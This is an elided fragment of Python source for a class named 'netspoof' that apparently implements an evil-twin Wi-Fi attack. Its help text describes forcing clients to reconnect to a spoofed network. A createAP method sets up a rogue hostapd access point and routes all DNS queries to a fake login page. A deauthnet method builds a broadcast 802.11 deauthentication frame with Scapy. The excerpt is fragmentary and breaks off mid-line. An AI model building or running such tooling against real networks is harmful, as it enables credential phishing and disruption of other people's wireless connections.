...
class netspoof():
	...
	def help(self):
		hlp =("\nDescription:\n"
			...
			"into reconecting with a spoofed network.If you wish to exit the spoof "
			"use the control + c\n"
			"\nUsage:\n"
			"############\n"
	...
	def createAP(self,ssid,iface,channel):
		...
		#all dns queries are routed to 10.0.0.1 where the fake login page is located
		...
		config = ("# Defaults for hostapd initscript\n"
				"#\n"
		...
		os.system("iptables -i wlan0 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT")
	...
	def deauthnet(self,iface,bssid):
		...
		packet = (RadioTap()/Dot11(type=0,addr1="ff:ff:ff:ff:ff:ff",addr2="A8:D3:F7:0F:9B:34",
